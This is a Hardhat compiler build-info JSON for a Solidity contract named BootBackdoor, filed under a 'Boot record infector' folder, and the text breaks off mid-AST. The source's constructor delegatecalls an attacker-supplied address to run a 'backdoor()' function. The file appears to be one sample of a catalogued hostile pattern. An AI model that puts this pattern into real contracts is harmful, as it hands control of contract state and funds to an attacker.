{
	"id": "0f4ed26eada35807144faf95e5f2e535",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.29",
	"solcLongVersion": "0.8.29+commit.ab55807c",
	"input": {
		"language": "Solidity",
		"sources": {
			"B/Boot record infector/Constructor-Based Backdoor.sol": {
				"content": "contract BootBackdoor {\n    address public safe;\n    address public attacker;\n\n    constructor(address _safe, address _attacker) {\n        safe = _safe;\n        attacker = _attacker;\n\n        // Infects the first execution flow\n        (bool ok, ) = attacker.delegatecall(\n            abi.encodeWithSignature(\"backdoor()\")\n        );\n        require(ok, \"Infection failed\");\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"B/Boot record infector/Constructor-Based Backdoor.sol": {
				"BootBackdoor": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_safe",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "_attacker",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "attacker",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "safe",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":0:382  contract BootBackdoor {... */\n  mstore(0x40, 0x80)\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":83:380  constructor(address _safe, address _attacker) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":146:151  _safe */\n  dup2\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":139:143  safe */\n  0x00\n  0x00\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":139:151  safe = _safe */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":172:181  _attacker */\n  dup1\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":161:169  attacker */\n  0x01\n  0x00\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":161:181  attacker = _attacker */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":237:244  bool ok */\n  0x00\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":250:258  attacker */\n  0x01\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":250:271  attacker.delegatecall */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":285:322  abi.encodeWithSignature(\"backdoor()\") */\n  add(0x24, mload(0x40))\n  mload(0x40)\n  0x20\n  dup2\n  dup4\n  sub\n  sub\n  dup2\n  mstore\n  swap1\n  0x40\n  mstore\n  and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x2665f77d00000000000000000000000000000000000000000000000000000000)\n  0x20\n  dup3\n  add\n  dup1\n  mload\n  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n  dup4\n  dup2\n  dup4\n  and\n  or\n  dup4\n  mstore\n  pop\n  pop\n  pop\n  pop\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":250:332  attacker.delegatecall(... */\n  mload(0x40)\n  tag_6\n  swap2\n  swap1\n  tag_7\n  jump\t// in\ntag_6:\n  0x00\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup6\n  gas\n  delegatecall\n  swap2\n  pop\n  pop\n  returndatasize\n  dup1\n  0x00\n  dup2\n  eq\n  tag_10\n  jumpi\n  mload(0x40)\n  swap2\n  pop\n  and(add(returndatasize, 0x3f), not(0x1f))\n  dup3\n  add\n  0x40\n  mstore\n  returndatasize\n  dup3\n  mstore\n  returndatasize\n  0x00\n  0x20\n  dup5\n  add\n  returndatacopy\n  jump(tag_9)\ntag_10:\n  0x60\n  swap2\n  pop\ntag_9:\n  pop\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":236:332  (bool ok, ) = attacker.delegatecall(... */\n  pop\n  swap1\n  pop\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":350:352  ok */\n  dup1\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":342:373  require(ok, \"Infection failed\") */\n  tag_11\n  jumpi\n  mload(0x40)\n  0x08c379a000000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n  0x04\n  add\n  tag_12\n  swap1\n  tag_13\n  jump\t// in\ntag_12:\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  revert\ntag_11:\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":129:380  {... */\n  pop\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":83:380  constructor(address _safe, address _attacker) {... */\n  pop\n  pop\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":0:382  contract BootBackdoor {... */\n  jump(tag_14)\n    /* \"#utility.yul\":88:205   */\ntag_16:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_18:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_19:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_35\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_18\n  jump\t// in\ntag_35:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_20:\n    /* \"#utility.yul\":641:665   */\n  tag_37\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_19\n  jump\t// in\ntag_37:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_38\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_38:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_21:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_40\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_20\n  jump\t// in\ntag_40:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1352   */\ntag_3:\n    /* \"#utility.yul\":924:930   */\n  0x00\n    /* \"#utility.yul\":932:938   */\n  0x00\n    /* \"#utility.yul\":981:983   */\n  0x40\n    /* \"#utility.yul\":969:978   */\n  dup4\n    /* \"#utility.yul\":960:967   */\n  dup6\n    /* \"#utility.yul\":956:979   */\n  sub\n    /* \"#utility.yul\":952:984   */\n  slt\n    /* \"#utility.yul\":949:1068   */\n  iszero\n  tag_42\n  jumpi\n    /* \"#utility.yul\":987:1066   */\n  tag_43\n  tag_16\n  jump\t// in\ntag_43:\n    /* \"#utility.yul\":949:1068   */\ntag_42:\n    /* \"#utility.yul\":1107:1108   */\n  0x00\n    /* \"#utility.yul\":1132:1196   */\n  tag_44\n    /* \"#utility.yul\":1188:1195   */\n  dup6\n    /* \"#utility.yul\":1179:1185   */\n  dup3\n    /* \"#utility.yul\":1168:1177   */\n  dup7\n    /* \"#utility.yul\":1164:1186   */\n  add\n    /* \"#utility.yul\":1132:1196   */\n  tag_21\n  jump\t// in\ntag_44:\n    /* \"#utility.yul\":1122:1196   */\n  swap3\n  pop\n    /* \"#utility.yul\":1078:1206   */\n  pop\n    /* \"#utility.yul\":1245:1247   */\n  0x20\n    /* \"#utility.yul\":1271:1335   */\n  tag_45\n    /* \"#utility.yul\":1327:1334   */\n  dup6\n    /* \"#utility.yul\":1318:1324   */\n  dup3\n    /* \"#utility.yul\":1307:1316   */\n  dup7\n    /* \"#utility.yul\":1303:1325   */\n  add\n    /* \"#utility.yul\":1271:1335   */\n  tag_21\n  jump\t// in\ntag_45:\n    /* \"#utility.yul\":1261:1335   */\n  swap2\n  pop\n    /* \"#utility.yul\":1216:1345   */\n  pop\n    /* \"#utility.yul\":845:1352   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1358:1456   */\ntag_22:\n    /* \"#utility.yul\":1409:1415   */\n  0x00\n    /* \"#utility.yul\":1443:1448   */\n  dup2\n    /* \"#utility.yul\":1437:1449   */\n  mload\n    /* \"#utility.yul\":1427:1449   */\n  swap1\n  pop\n    /* \"#utility.yul\":1358:1456   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1462:1609   */\ntag_23:\n    /* \"#utility.yul\":1563:1574   */\n  0x00\n    /* \"#utility.yul\":1600:1603   */\n  dup2\n    /* \"#utility.yul\":1585:1603   */\n  swap1\n  pop\n    /* \"#utility.yul\":1462:1609   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1615:1754   */\ntag_24:\n    /* \"#utility.yul\":1704:1710   */\n  dup3\n    /* \"#utility.yul\":1699:1702   */\n  dup2\n    /* \"#utility.yul\":1694:1697   */\n  dup4\n    /* \"#utility.yul\":1688:1711   */\n  mcopy\n    /* \"#utility.yul\":1745:1746   */\n  0x00\n    /* \"#utility.yul\":1736:1742   */\n  dup4\n    /* \"#utility.yul\":1731:1734   */\n  dup4\n    /* \"#utility.yul\":1727:1743   */\n  add\n    /* \"#utility.yul\":1720:1747   */\n  mstore\n    /* \"#utility.yul\":1615:1754   */\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1760:2146   */\ntag_25:\n    /* \"#utility.yul\":1864:1867   */\n  0x00\n    /* \"#utility.yul\":1892:1930   */\n  tag_50\n    /* \"#utility.yul\":1924:1929   */\n  dup3\n    /* \"#utility.yul\":1892:1930   */\n  tag_22\n  jump\t// in\ntag_50:\n    /* \"#utility.yul\":1946:2034   */\n  tag_51\n    /* \"#utility.yul\":2027:2033   */\n  dup2\n    /* \"#utility.yul\":2022:2025   */\n  dup6\n    /* \"#utility.yul\":1946:2034   */\n  tag_23\n  jump\t// in\ntag_51:\n    /* \"#utility.yul\":1939:2034   */\n  swap4\n  pop\n    /* \"#utility.yul\":2043:2108   */\n  tag_52\n    /* \"#utility.yul\":2101:2107   */\n  dup2\n    /* \"#utility.yul\":2096:2099   */\n  dup6\n    /* \"#utility.yul\":2089:2093   */\n  0x20\n    /* \"#utility.yul\":2082:2087   */\n  dup7\n    /* \"#utility.yul\":2078:2094   */\n  add\n    /* \"#utility.yul\":2043:2108   */\n  tag_24\n  jump\t// in\ntag_52:\n    /* \"#utility.yul\":2133:2139   */\n  dup1\n    /* \"#utility.yul\":2128:2131   */\n  dup5\n    /* \"#utility.yul\":2124:2140   */\n  add\n    /* \"#utility.yul\":2117:2140   */\n  swap2\n  pop\n    /* \"#utility.yul\":1868:2146   */\n  pop\n    /* \"#utility.yul\":1760:2146   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2152:2423   */\ntag_7:\n    /* \"#utility.yul\":2282:2285   */\n  0x00\n    /* \"#utility.yul\":2304:2397   */\n  tag_54\n    /* \"#utility.yul\":2393:2396   */\n  dup3\n    /* \"#utility.yul\":2384:2390   */\n  dup5\n    /* \"#utility.yul\":2304:2397   */\n  tag_25\n  jump\t// in\ntag_54:\n    /* \"#utility.yul\":2297:2397   */\n  swap2\n  pop\n    /* \"#utility.yul\":2414:2417   */\n  dup2\n    /* \"#utility.yul\":2407:2417   */\n  swap1\n  pop\n    /* \"#utility.yul\":2152:2423   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2429:2598   */\ntag_26:\n    /* \"#utility.yul\":2513:2524   */\n  0x00\n    /* \"#utility.yul\":2547:2553   */\n  dup3\n    /* \"#utility.yul\":2542:2545   */\n  dup3\n    /* \"#utility.yul\":2535:2554   */\n  mstore\n    /* \"#utility.yul\":2587:2591   */\n  0x20\n    /* \"#utility.yul\":2582:2585   */\n  dup3\n    /* \"#utility.yul\":2578:2592   */\n  add\n    /* \"#utility.yul\":2563:2592   */\n  swap1\n  pop\n    /* \"#utility.yul\":2429:2598   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2604:2770   */\ntag_27:\n    /* \"#utility.yul\":2744:2762   */\n  0x496e66656374696f6e206661696c656400000000000000000000000000000000\n    /* \"#utility.yul\":2740:2741   */\n  0x00\n    /* \"#utility.yul\":2732:2738   */\n  dup3\n    /* \"#utility.yul\":2728:2742   */\n  add\n    /* \"#utility.yul\":2721:2763   */\n  mstore\n    /* \"#utility.yul\":2604:2770   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":2776:3142   */\ntag_28:\n    /* \"#utility.yul\":2918:2921   */\n  0x00\n    /* \"#utility.yul\":2939:3006   */\n  tag_58\n    /* \"#utility.yul\":3003:3005   */\n  0x10\n    /* \"#utility.yul\":2998:3001   */\n  dup4\n    /* \"#utility.yul\":2939:3006   */\n  tag_26\n  jump\t// in\ntag_58:\n    /* \"#utility.yul\":2932:3006   */\n  swap2\n  pop\n    /* \"#utility.yul\":3015:3108   */\n  tag_59\n    /* \"#utility.yul\":3104:3107   */\n  dup3\n    /* \"#utility.yul\":3015:3108   */\n  tag_27\n  jump\t// in\ntag_59:\n    /* \"#utility.yul\":3133:3135   */\n  0x20\n    /* \"#utility.yul\":3128:3131   */\n  dup3\n    /* \"#utility.yul\":3124:3136   */\n  add\n    /* \"#utility.yul\":3117:3136   */\n  swap1\n  pop\n    /* \"#utility.yul\":2776:3142   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":3148:3567   */\ntag_13:\n    /* \"#utility.yul\":3314:3318   */\n  0x00\n    /* \"#utility.yul\":3352:3354   */\n  0x20\n    /* \"#utility.yul\":3341:3350   */\n  dup3\n    /* \"#utility.yul\":3337:3355   */\n  add\n    /* \"#utility.yul\":3329:3355   */\n  swap1\n  pop\n    /* \"#utility.yul\":3401:3410   */\n  dup2\n    /* \"#utility.yul\":3395:3399   */\n  dup2\n    /* \"#utility.yul\":3391:3411   */\n  sub\n    /* \"#utility.yul\":3387:3388   */\n  0x00\n    /* \"#utility.yul\":3376:3385   */\n  dup4\n    /* \"#utility.yul\":3372:3389   */\n  add\n    /* \"#utility.yul\":3365:3412   */\n  mstore\n    /* \"#utility.yul\":3429:3560   */\n  tag_61\n    /* \"#utility.yul\":3555:3559   */\n  dup2\n    /* \"#utility.yul\":3429:3560   */\n  tag_28\n  jump\t// in\ntag_61:\n    /* \"#utility.yul\":3421:3560   */\n  swap1\n  pop\n    /* \"#utility.yul\":3148:3567   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":0:382  contract BootBackdoor {... */\ntag_14:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":0:382  contract BootBackdoor {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x186f0354\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x48eb76ee\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":28:47  address public safe */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":53:76  address public attacker */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":28:47  address public safe */\n    tag_6:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"B/Boot record infector/Constructor-Based Backdoor.sol\":53:76  address public attacker */\n    tag_10:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_12:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_13:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_18\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_12\n      jump\t// in\n    tag_18:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_14:\n        /* \"#utility.yul\":328:352   */\n      tag_20\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_13\n      jump\t// in\n    tag_20:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_8:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_22\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_14\n      jump\t// in\n    tag_22:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212201340d7c46579a0c510b0c09cc75cea69e1948ab2da9fd28e47d9e6af1613055964736f6c634300081d0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_35": {
									"entryPoint": null,
									"id": 35,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 588,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_addresst_address_fromMemory": {
									"entryPoint": 608,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 2
								},
								"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 704,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524_to_t_string_memory_ptr_fromStack": {
									"entryPoint": 830,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 752,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": 864,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"array_length_t_bytes_memory_ptr": {
									"entryPoint": 670,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 680,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_string_memory_ptr_fromStack": {
									"entryPoint": 774,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 549,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 518,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"copy_memory_to_memory_with_cleanup": {
									"entryPoint": 690,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 514,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"store_literal_in_memory_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524": {
									"entryPoint": 790,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 566,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:3570:1",
										"nodeType": "YulBlock",
										"src": "0:3570:1",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:1",
													"nodeType": "YulBlock",
													"src": "47:35:1",
													"statements": [
														{
															"nativeSrc": "57:19:1",
															"nodeType": "YulAssignment",
															"src": "57:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:1",
																		"nodeType": "YulLiteral",
																		"src": "73:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:1"
																},
																"nativeSrc": "67:9:1",
																"nodeType": "YulFunctionCall",
																"src": "67:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:1",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:1",
														"nodeType": "YulTypedName",
														"src": "40:6:1",
														"type": ""
													}
												],
												"src": "7:75:1"
											},
											{
												"body": {
													"nativeSrc": "177:28:1",
													"nodeType": "YulBlock",
													"src": "177:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:1",
																		"nodeType": "YulLiteral",
																		"src": "194:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:1",
																		"nodeType": "YulLiteral",
																		"src": "197:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:1"
																},
																"nativeSrc": "187:12:1",
																"nodeType": "YulFunctionCall",
																"src": "187:12:1"
															},
															"nativeSrc": "187:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:1"
											},
											{
												"body": {
													"nativeSrc": "300:28:1",
													"nodeType": "YulBlock",
													"src": "300:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:1",
																		"nodeType": "YulLiteral",
																		"src": "317:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:1",
																		"nodeType": "YulLiteral",
																		"src": "320:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:1"
																},
																"nativeSrc": "310:12:1",
																"nodeType": "YulFunctionCall",
																"src": "310:12:1"
															},
															"nativeSrc": "310:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:1"
											},
											{
												"body": {
													"nativeSrc": "379:81:1",
													"nodeType": "YulBlock",
													"src": "379:81:1",
													"statements": [
														{
															"nativeSrc": "389:65:1",
															"nodeType": "YulAssignment",
															"src": "389:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:1",
																		"nodeType": "YulLiteral",
																		"src": "411:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:1"
																},
																"nativeSrc": "400:54:1",
																"nodeType": "YulFunctionCall",
																"src": "400:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:1",
														"nodeType": "YulTypedName",
														"src": "361:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:1",
														"nodeType": "YulTypedName",
														"src": "371:7:1",
														"type": ""
													}
												],
												"src": "334:126:1"
											},
											{
												"body": {
													"nativeSrc": "511:51:1",
													"nodeType": "YulBlock",
													"src": "511:51:1",
													"statements": [
														{
															"nativeSrc": "521:35:1",
															"nodeType": "YulAssignment",
															"src": "521:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:1"
																	}
																],
